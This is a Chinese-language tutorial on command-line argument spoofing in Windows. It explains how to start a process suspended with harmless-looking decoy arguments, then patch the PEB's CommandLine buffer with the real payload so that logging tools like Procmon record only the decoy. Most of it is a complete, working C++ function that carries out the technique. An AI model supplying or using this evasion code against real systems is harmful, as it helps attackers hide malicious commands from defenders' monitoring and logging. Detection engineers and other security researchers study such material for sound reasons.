# Commandline Spoofing

进程参数欺骗是一种用于隐藏新生成的进程的命令行参数的技术，以便于执行命令，而不会将它们透露给日志服务，例如[Procmon](https://learn.microsoft.com/en-us/sysinternals/downloads/procmon)。

要执行命令行参数欺骗，必须首先创建一个处于挂起状态的目标进程，并传递不被视为可疑的虚拟参数。在恢复进程之前，`PEB->ProcessParameters.CommandLine.Buffer` 需要使用所需的有效负载字符串修补该字符串，这将导致日志记录服务记录虚拟参数而不是要执行的实际命令行参数。要执行此过程，必须执行以下步骤：

1. 创建处于挂起状态的目标进程。
2. `PEB`获取创建的进程的远程地址。
3. `PEB`从创建的进程中读取远程结构。
4. `PEB->ProcessParameters`从创建的进程中读取远程结构。
5. 修补字符串`ProcessParameters.CommandLine.Buffer`，并用要执行的有效负载覆盖。
6. 恢复该过程。

在运行时写入的有效负载参数的长度`Peb->ProcessParameters.CommandLine.Buffer` 必须小于或等于挂起进程创建期间创建的虚拟参数的长度。如果真实参数较大，它可能会覆盖虚拟参数之外的字节，导致进程崩溃。为了避免这种情况，请始终确保虚拟参数大于将执行的参数。



```c++
BOOL CreateArgSpoofedProcess(IN LPWSTR szStartupArgs, IN LPWSTR szRealArgs, OUT DWORD* dwProcessId, OUT HANDLE* hProcess, OUT HANDLE* hThread) {

	NTSTATUS                      STATUS   = NULL;

	WCHAR                         szProcess [MAX_PATH];

	STARTUPINFOW                  Si       = { 0 };
	PROCESS_INFORMATION           Pi       = { 0 };

	PROCESS_BASIC_INFORMATION     PBI      = { 0 };
	ULONG                         uRetern  = NULL;

	PPEB                          pPeb     = NULL;
	PRTL_USER_PROCESS_PARAMETERS  pParms   = NULL;


	RtlSecureZeroMemory(&Si, sizeof(STARTUPINFOW));
	RtlSecureZeroMemory(&Pi, sizeof(PROCESS_INFORMATION));

	Si.cb = sizeof(STARTUPINFOW);

	// Getting the address of the NtQueryInformationProcess function
	fnNtQueryInformationProcess pNtQueryInformationProcess = (fnNtQueryInformationProcess)GetProcAddress(GetModuleHandleW(L"NTDLL"), "NtQueryInformationProcess");
	if (pNtQueryInformationProcess == NULL) 
		return FALSE;


	lstrcpyW(szProcess, szStartupArgs);

	if (!CreateProcessW(
		NULL,
		szProcess,
		NULL,
		NULL,
		FALSE,
		CREATE_SUSPENDED | CREATE_NO_WINDOW,      // creating the process suspended & with no window
		NULL,
		L"C:\\Windows\\System32\\",               // we can use GetEnvironmentVariableW to get this Programmatically
		&Si,
		&Pi)) {
		printf("\t[!] CreateProcessA Failed with Error : %d \n", GetLastError());
		return FALSE;
	}


	// Getting the PROCESS_BASIC_INFORMATION structure of the remote process which contains the PEB address
	if ((STATUS = pNtQueryInformationProcess(Pi.hProcess, ProcessBasicInformation, &PBI, sizeof(PROCESS_BASIC_INFORMATION), &uRetern)) != 0) {
		printf("\t[!] NtQueryInformationProcess Failed With Error : 0x%0.8X \n", STATUS);
		return FALSE;
	}
	
	// Reading the PEB structure from its base address in the remote process
	if (!ReadFromTargetProcess(Pi.hProcess, PBI.PebBaseAddress, &pPeb, sizeof(PEB))) {
		printf("\t[!] Failed To Read Target's Process Peb \n");
		return FALSE;
	}

	// Reading the RTL_USER_PROCESS_PARAMETERS structure from the PEB of the remote process
	// Read an extra 0xFF bytes to ensure we have reached the CommandLine.Buffer pointer
	// 0xFF is 255 but it can be whatever you like
	if (!ReadFromTargetProcess(Pi.hProcess, pPeb->ProcessParameters, &pParms, sizeof(RTL_USER_PROCESS_PARAMETERS) + 0xFF)) {
		printf("\t[!] Failed To Read Target's Process ProcessParameters \n");
		return FALSE;
	}

	// Writing the real argument to the process
	if (!WriteToTargetProcess(Pi.hProcess, (PVOID)pParms->CommandLine.Buffer, (PVOID)szRealArgs, (DWORD)(lstrlenW(szRealArgs) * sizeof(WCHAR) + 1))) {
		printf("\t[!] Failed To Write The Real Parameters\n");
		return FALSE;
	}


	// Cleaning up
	HeapFree(GetProcessHeap(), NULL, pPeb);
	HeapFree(GetProcessHeap(), NULL, pParms);

	// Resuming the process with the new paramters
	ResumeThread(Pi.hThread);

	// Saving output parameters
	*dwProcessId     = Pi.dwProcessId;
	*hProcess        = Pi.hProcess;
	*hThread         = Pi.hThread;

	// Checking if everything is valid
	if (*dwProcessId != NULL, *hProcess != NULL && *hThread != NULL)
		return TRUE;

	return FALSE;
}
```

